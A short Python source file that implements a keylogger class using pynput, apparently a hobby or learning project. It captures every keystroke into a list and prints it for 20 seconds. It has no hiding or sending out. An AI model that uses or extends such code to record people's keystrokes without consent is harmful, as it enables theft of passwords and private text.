from IKeylogger import IKeyLogger
from pynput.keyboard import Key, Listener

import time
class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.data = []
        self.listener = Listener(on_press=self.__on_press)
    
    #The listener start to listen to everey press keyboard
    def start_logging(self):
        self.listener.start()

    #Add to data the press keyboard
    def __on_press(self, key):
        key_str = self.__format_key(key)
        self.data.append(key_str)
        print(key_str)

    #Format every key to str
    def __format_key(self, key):
        if isinstance(key, Key):
            return f"[{key.name.upper()}]"
        else:
            return key.char if hasattr(key, 'char') else str(key)




logger = KeyLoggerService()
logger.start_logging()
time.sleep(20)


    

        